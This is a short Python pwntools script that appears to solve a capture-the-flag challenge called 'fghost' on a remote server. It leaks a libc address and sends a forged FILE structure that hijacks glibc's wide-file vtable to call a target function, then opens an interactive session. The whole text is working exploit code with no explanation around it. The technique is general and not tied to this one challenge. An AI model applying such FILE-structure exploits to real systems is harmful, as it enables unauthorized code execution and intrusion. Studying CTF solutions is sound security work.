#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './fghost')
libc = ELF(exe.libc.path)

io = remote("34.252.33.37", 31302)

io.recvuntil(b"this: 0x")
libc.address = int(io.recvline().strip(), 16) - libc.sym.puts

fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps']-0x18
fs._wide_data = libc.sym['_IO_2_1_stdout_']
fs._lock = libc.address + 0x21ba70 

io.send(bytes(fs) + p64((libc.sym['_IO_2_1_stdout_'] + 0xe0 +8) - 0x68) + p64(exe.sym.callme))
io.interactive()

